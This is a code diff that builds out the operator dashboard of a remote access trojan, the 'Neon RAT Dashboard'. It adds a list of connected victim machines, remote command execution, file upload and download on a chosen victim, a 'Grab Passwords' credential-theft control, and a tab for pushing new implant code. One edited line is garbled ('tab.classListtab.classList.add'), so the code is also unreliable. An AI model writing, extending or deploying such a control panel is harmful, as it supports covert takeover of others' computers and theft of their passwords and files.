@@ -6,40 +6,158 @@
     <title>Neon RAT Dashboard</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
-        /* Previous CSS remains the same */
-        .notes-panel {
+        :root {
+            --primary: #6c5ce7;
+            --secondary: #00cec9;
+            --danger: #ff7675;
+            --warning: #fdcb6e;
+            --dark: #2d3436;
+            --light: #f5f6fa;
+            --bg-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: var(--bg-gradient);
+            color: var(--light);
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+        }
+        .container {
+            display: flex;
+            height: 100vh;
+        }
+        .sidebar {
+            width: 250px;
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            padding: 20px;
+            overflow-y: auto;
+            border-right: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .sidebar h2 {
+            color: var(--secondary);
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .client-tab {
+            padding: 12px;
+            margin-bottom: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+        }
+        .client-tab:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateX(5px);
+        }
+        .client-tab.active {
+            background: var(--primary);
+            box-shadow: 0 0 10px rgba(108, 92, 231, 0.5);
+        }
+        .client-icon {
+            width: 10px;
+            height: 10px;
+            background: var(--secondary);
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+        .main {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+        }
+        .panel {
             background: rgba(0, 0, 0, 0.3);
             backdrop-filter: blur(10px);
             border-radius: 12px;
             padding: 20px;
-            margin-top: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
         }
-        .notes-panel h3 {
+        .panel h3 {
             color: var(--secondary);
             margin-top: 0;
         }
-        #notes-input {
+        .tab-buttons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .tab-btn {
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: var(--light);
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .tab-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        .tab-btn.active {
+            background: var(--primary);
+            box-shadow: 0 0 10px rgba(108, 92, 231, 0.5);
+        }
+        input, textarea, select {
             width: 100%;
-            min-height: 100px;
             padding: 10px;
             margin-bottom: 10px;
             border: none;
             border-radius: 8px;
             background: rgba(255, 255, 255, 0.1);
             color: var(--light);
-            resize: vertical;
         }
-        #save-notes {
+        button {
             background: var(--primary);
+            color: var(--light);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-right: 10px;
+        }
+        button:hover {
+            background: var(--secondary);
+            transform: translateY(-2px);
+        }
+        button.danger {
+            background: var(--danger);
+        }
+        button.warning {
+            background: var(--warning);
+            color: var(--dark);
+        }
+        pre {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 8px;
+            overflow-x: auto;
+            color: var(--light);
+        }
+        .status {
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            background: var(--secondary);
+            color: var(--dark);
+            display: inline-block;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Sidebar (unchanged) -->
+        <!-- Sidebar -->
         <div class="sidebar">
             <h2>Connected Clients</h2>
-            <div id="client-list"></div>
+            <div id="client-list">
+                <!-- Dynamically populated -->
+            </div>
         </div>
 
         <!-- Main Content -->
@@ -69,30 +187,42 @@
                     <button onclick="clickMouse('left')">Left Click</button>
                     <button onclick="clickMouse('right')">Right Click</button>
                 </div>
+            </div>
 
-                <!-- New Notes Section -->
-                <div class="notes-panel">
-                    <h3>Notes</h3>
-                    <textarea id="notes-input" placeholder="Write your notes here..."></textarea>
-                    <button id="save-notes" onclick="saveNotes()">Save Notes</button>
+            <!-- Files Tab -->
+            <div id="files" class="tab-content">
+                <div class="panel">
+                    <h3>File Transfer</h3>
+                    <input type="file" id="file-input">
+                    <button onclick="uploadFile()">Upload</button>
+                    <input type="text" id="download-filename" placeholder="Filename to download">
+                    <button onclick="downloadFile()">Download</button>
                 </div>
             </div>
 
-            <!-- Other Tabs (unchanged) -->
-            <div id="files" class="tab-content">
-                <!-- File transfer UI -->
-            </div>
+            <!-- Passwords Tab -->
             <div id="passwords" class="tab-content">
-                <!-- Password retrieval UI -->
+                <div class="panel">
+                    <h3>Password Retrieval</h3>
+                    <button onclick="getPasswords()">Grab Passwords</button>
+                    <pre id="passwords-output">No passwords retrieved yet.</pre>
+                </div>
             </div>
+
+            <!-- Update Tab -->
             <div id="update" class="tab-content">
-                <!-- Client update UI -->
+                <div class="panel">
+                    <h3>Update Client Code</h3>
+                    <textarea id="client-code" placeholder="Paste new client code here..."></textarea>
+                    <button onclick="updateClient()">Update</button>
+                    <pre id="update-status">Ready for updates.</pre>
+                </div>
             </div>
         </div>
     </div>
 
     <script>
-        // Tab management (unchanged)
+        // Tab management
         function openTab(tabName) {
             document.querySelectorAll('.tab-content').forEach(tab => {
                 tab.style.display = 'none';
@@ -104,7 +234,7 @@
             event.currentTarget.classList.add('active');
         }
 
-        // Client management (unchanged)
+        // Client management
         let selectedClient = null;
         function updateClients() {
             fetch('/api/clients')
@@ -115,7 +245,7 @@
                     data.clients.forEach(client => {
                         const tab = document.createElement('div');
                         tab.className = 'client-tab';
-                        if (client === selectedClient) tab.classList.add('active');
+                        if (client === selectedClient) tab.classListtab.classList.add('active');
                         tab.innerHTML = `
                             <div class="client-icon"></div>
                             ${client}
@@ -134,23 +264,45 @@
             setTimeout(updateClients, 2000);
         }
 
-        // Notes functionality
-        function loadNotes() {
-            const savedNotes = localStorage.getItem('rat_notes');
-            if (savedNotes) {
-                document.getElementById('notes-input').value = savedNotes;
-            }
+        // Command execution
+        function sendCommand() {
+            if (!selectedClient) return alert('Select a client first!');
+            const command = document.getElementById('command-input').value;
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ client_id: selectedClient, command: command })
+            }).then(res => res.json())
+              .then(data => {
+                  document.getElementById('command-output').textContent = data.output || data.error;
+              });
         }
 
-        function saveNotes() {
-            const notes = document.getElementById('notes-input').value;
-            localStorage.setItem('rat_notes', notes);
-            alert('Notes saved!');
+        // File upload/download
+        function uploadFile() {
+            if (!selectedClient) return alert('Select a client first!');
+            const fileInput = document.getElementById('file-input');
+            const file = fileInput.files[0];
+            if (!file) return alert('No file selected!');
+
+            const formData = new FormData();
+            formData.append('file', file);
+            fetch(`/api/upload?client_id=${selectedClient}`, {
+                method: 'POST',
+                body: formData
+            }).then(res => res.json())
+              .then(data => alert(data.status || data.error));
+        }
+
+        function downloadFile() {
+            if (!selectedClient) return alert('Select a client first!');
+            const filename = document.getElementById('download-filename').value;
+            if (!filename) return alert('Enter a filename!');
+            window.open(`/api/download?client_id=${selectedClient}&filename=${filename}`, '_blank');
         }
 
         // Initialize
         updateClients();
-        loadNotes(); // Load saved notes on page load
     </script>
 </body>
 </html>
